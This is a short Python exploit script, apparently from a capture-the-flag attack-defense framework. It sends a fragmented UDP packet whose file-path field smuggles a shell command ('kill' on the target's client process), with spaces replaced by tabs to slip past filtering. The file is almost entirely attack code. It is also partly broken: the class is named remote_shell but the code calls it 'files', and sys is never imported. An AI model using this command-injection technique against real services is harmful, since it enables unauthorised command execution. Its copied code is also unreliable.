#!/usr/bin/python

import os
from base_exploit import *
from reporter import *
from netfw import *

class remote_shell(base_exploit):
    id = EXPLOIT_ID_FILES

    def __init__(self, team_config):
        pass #super(files, self).__init__(team_config)

    def exploit(self, ip, port):
        reporter = reporter_init()

        # Create a connection to requested destination
        s = socket(AF_INET, SOCK_DGRAM)
        s.connect((ip, port))

        # Change script's working directory to this dir
        abspath = os.path.abspath(__file__)
        dname = os.path.dirname(abspath)
        os.chdir(dname)

        # Read the payload
        payload = " "

        # Path to override
        #path = "somefile;kill `pidof client | tr \" \" \\\\\\\\n | head -n 1`\x00".replace(" ", "\t")
        path = "somefile;kill `pidof -s client`".replace(" ", "\t")

        # Create the malicious packet
        pkt = ProtocolHandleUpper(path, payload)

        # Fragment the packets and send
        FragmentedPacket(pkt).send(s)

        return reporter_wait(reporter)

    def run(self):
        return super(files, self).run()

    def score(self, report):
        return super(files, self).score(report)


if __name__ == "__main__":
    if (len(sys.argv) != 3):
        print "RemoteShell exploit"
        print "Usage: %s <ip> <Wrapper RECV port>" % (sys.argv[0])
        exit(0)

    exp = files(TEAM_CONFIG_DEBUG)
    score = exp.run()
    print "exploit returned score %s" % score
